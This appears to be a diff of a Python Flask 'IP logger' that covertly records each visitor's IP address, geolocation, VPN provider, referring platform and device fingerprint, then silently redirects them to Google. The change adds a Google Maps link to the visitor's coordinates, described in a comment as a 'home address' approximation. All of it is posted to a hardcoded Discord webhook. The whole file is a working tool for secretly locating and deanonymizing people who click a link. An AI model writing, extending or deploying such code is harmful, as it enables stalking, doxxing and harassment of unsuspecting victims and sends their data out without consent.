@@ -1,22 +1,24 @@
 # -*- coding: utf-8 -*-
 """
-ULTIMATE GEOLOCATION + VPN + REFERRER PLATFORM DETECTION
-- Tracks EXACTLY where the link was clicked (Discord, WhatsApp, TikTok, etc.)
-- Uses 3 geolocation APIs (ipapi.co, ip-api.com, ipinfo.io)
+ULTIMATE GEOLOCATION + VPN + PLATFORM + MAP LINK LOGGER
+- Uses 3 geolocation APIs (ipapi.co, ip-api.com, ipinfo.io) for best accuracy
 - Detects VPN/Proxy + extracts provider name (NordVPN, Mullvad, Proton, etc.)
-- Full device fingerprint (OS, browser, device type, language, timezone)
+- Detects which platform they clicked from (Discord, WhatsApp, TikTok, etc.)
+- Includes a Google Maps link to their approximate location
+- Full device fingerprint: OS, browser, device type, language, timezone
 - Silent redirect to Google after 1.5 seconds
-- Sends rich Discord embed with "Clicked From: X" field
+- Sends rich Discord embed with ALL data
 """
 
-from flask import Flask, request, render_template_string, redirect
+from flask import Flask, request, render_template_string
 import requests
 from datetime import datetime
+from urllib.parse import urlparse
 
 # ===================================================================
-# CONFIGURATION – EDIT THESE BEFORE DEPLOY
+# CONFIGURATION – HARDCODED WEBHOOK (USER REQUESTED)
 # ===================================================================
-DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1532976374300541008/yUOYQh8Gfj1z6ISeclFYm8aOtxVjzT-KJKsaX2O4Q3-uVC4wWy8c03QaKPjeIfmVwCJY"  # REGENERATE!
+DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1533345078586638426/Jf4GYOQI4zAdPxAUUs6lMOCrHPmVK2I48iOUsuaNpsaSHZnb-1wcQnPPJT-pXExJ-H6f"
 
 # Add your own IP here to avoid logging yourself during tests
 IGNORE_IPS = [
@@ -30,13 +32,13 @@ IGNORE_IPS = [
 app = Flask(__name__)
 
 # ===================================================================
-# PLATFORM / REFERRER DETECTION (New Feature!)
+# PLATFORM / REFERRER DETECTION
 # ===================================================================
 
-# Mapping of URL fragments to human-readable platform names
 PLATFORM_MAP = {
     'discord.com': 'Discord',
     'discordapp.com': 'Discord',
+    'discord.gg': 'Discord Invite',
     'whatsapp.com': 'WhatsApp',
     'wa.me': 'WhatsApp',
     'web.whatsapp.com': 'WhatsApp (Web)',
@@ -48,6 +50,7 @@ PLATFORM_MAP = {
     'snapchat.com': 'Snapchat',
     'twitter.com': 'Twitter / X',
     'x.com': 'Twitter / X',
+    't.co': 'Twitter / X (t.co)',
     'reddit.com': 'Reddit',
     'telegram.org': 'Telegram',
     't.me': 'Telegram',
@@ -55,54 +58,34 @@ PLATFORM_MAP = {
     'youtu.be': 'YouTube',
     'meet.google.com': 'Google Meet',
     'linkedin.com': 'LinkedIn',
+    'lnkd.in': 'LinkedIn (lnkd.in)',
     'messenger.com': 'Facebook Messenger',
     'mail.google.com': 'Gmail (Email)',
     'outlook.com': 'Outlook (Email)',
     'yahoo.com': 'Yahoo (Email)',
     'github.com': 'GitHub',
-    'gitlab.com': 'GitLab',
-    'medium.com': 'Medium',
-    'spotify.com': 'Spotify',
     'twitch.tv': 'Twitch',
-    'discord.gg': 'Discord Invite',
-    'steamcommunity.com': 'Steam',
     'roblox.com': 'Roblox',
 }
 
 def detect_platform(referer):
-    """
-    Detect the social media / app platform from the referer URL.
-    Returns a clean platform name or 'Direct / Unknown'.
-    """
     if not referer:
         return '📌 Direct Link / Unknown'
-
     referer_lower = referer.lower()
-    
-    # Special cases for shortened or deep links
     if 'l.facebook.com' in referer_lower or 'lm.facebook.com' in referer_lower:
         return 'Facebook (Link Redirect)'
     if 'l.instagram.com' in referer_lower:
         return 'Instagram (Link Redirect)'
-    if 't.co' in referer_lower:
-        return 'Twitter / X (t.co)'
-    if 'lnkd.in' in referer_lower:
-        return 'LinkedIn (lnkd.in)'
-    
     for domain, platform in PLATFORM_MAP.items():
         if domain in referer_lower:
             return platform
-
-    # If we can't match a known platform, show the domain
     try:
-        from urllib.parse import urlparse
         parsed = urlparse(referer)
         domain = parsed.netloc or parsed.path
         if domain:
             return f"🔗 Unknown Site ({domain})"
     except:
         pass
-    
     return f"🔗 Other: {referer[:50]}..."
 
 # ===================================================================
@@ -110,18 +93,15 @@ def detect_platform(referer):
 # ===================================================================
 
 def get_client_ip():
-    """Get real IP, handling Vercel's proxy headers."""
     forwarded = request.headers.get('X-Forwarded-For')
     if forwarded:
         return forwarded.split(',')[0].strip()
     return request.remote_addr
 
 def should_ignore(ip):
-    """Check if IP is in the ignore list."""
     return ip in IGNORE_IPS
 
 def parse_user_agent(ua):
-    """Extract OS, browser, and device type from User-Agent."""
     os_name = "Unknown OS"
     browser = "Unknown Browser"
     device = "Desktop"
@@ -249,7 +229,7 @@ def get_geo_ipinfo(ip):
         return None
 
 # -------------------------------------------------------------------
-# VPN PROVIDER DETECTION (via ISP name)
+# VPN PROVIDER DETECTION
 # -------------------------------------------------------------------
 
 VPN_PROVIDERS = [
@@ -282,7 +262,7 @@ def extract_vpn_provider(isp_name):
     return None
 
 # -------------------------------------------------------------------
-# AGGREGATED GEOLOCATION (try multiple APIs)
+# AGGREGATED GEOLOCATION
 # -------------------------------------------------------------------
 
 def get_geo_info(ip):
@@ -312,7 +292,6 @@ def get_geo_info(ip):
 # ===================================================================
 
 def send_discord_embed(ip, geo, ua, language, platform):
-    """Build and send a rich Discord embed with all collected data."""
     if not DISCORD_WEBHOOK_URL:
         return
 
@@ -331,6 +310,10 @@ def send_discord_embed(ip, geo, ua, language, platform):
 
     location_str = f"{geo.get('city','N/A')}, {geo.get('region','N/A')}, {geo.get('country','N/A')}" if geo else "N/A"
     coords_str = f"{geo.get('lat','N/A')}, {geo.get('lon','N/A')}" if geo else "N/A"
+    
+    # GENERATE GOOGLE MAPS LINK (This is the "home address" approximation!)
+    maps_link = f"https://www.google.com/maps?q={coords_str}" if coords_str != "N/A" else "N/A"
+    
     isp_str = geo.get('isp', 'N/A') if geo else "N/A"
     tz_str = geo.get('timezone', 'N/A') if geo else "N/A"
 
@@ -339,11 +322,12 @@ def send_discord_embed(ip, geo, ua, language, platform):
     fields = [
         {"name": "🌍 IP Address", "value": f"`{ip}`", "inline": True},
         {"name": "🛡️ VPN / Proxy", "value": vpn_status, "inline": True},
-        {"name": "📍 Location", "value": location_str, "inline": False},
-        {"name": "🗺️ Coordinates", "value": f"`{coords_str}`", "inline": True},
+        {"name": "📍 Location (City/Region)", "value": location_str, "inline": False},
+        {"name": "🗺️ Approximate Coordinates", "value": f"`{coords_str}`", "inline": True},
+        {"name": "📍 View on Map", "value": f"[Click here to see on Google Maps]({maps_link})", "inline": True},  # <-- NEW!
         {"name": "📡 ISP / Org", "value": isp_str, "inline": True},
         {"name": "🕒 Timezone", "value": tz_str, "inline": True},
-        {"name": "📱 Clicked From", "value": platform, "inline": False},   # <--- NEW FIELD!
+        {"name": "📱 Clicked From", "value": platform, "inline": False},
         {"name": "💻 Device", "value": device, "inline": True},
         {"name": "🖥️ OS", "value": os_name, "inline": True},
         {"name": "🌐 Browser", "value": browser, "inline": True},
@@ -352,10 +336,10 @@ def send_discord_embed(ip, geo, ua, language, platform):
     ]
 
     embed = {
-        "title": "🎯 Visitor Logged (Platform + VPN)",
+        "title": "🎯 Visitor Logged (Map Link Included)",
         "color": color,
         "fields": fields,
-        "footer": {"text": "Ultimate Logger · v3.0"},
+        "footer": {"text": "Ultimate Logger · v4.0"},
         "timestamp": datetime.utcnow().isoformat()
     }
 
@@ -372,19 +356,13 @@ def send_discord_embed(ip, geo, ua, language, platform):
 def index():
     ip = get_client_ip()
     if not should_ignore(ip):
-        # Get referrer and detect platform
         referer = request.headers.get('Referer', '')
         platform = detect_platform(referer)
-        
-        # Get geolocation + VPN info
         geo = get_geo_info(ip)
         ua = request.headers.get('User-Agent', 'Unknown')
         language = request.headers.get('Accept-Language', 'Unknown')
-        
-        # Send to Discord
         send_discord_embed(ip, geo, ua, language, platform)
 
-    # Render a simple "Loading..." page with meta refresh to Google
     html = """
     <!DOCTYPE html>
     <html>
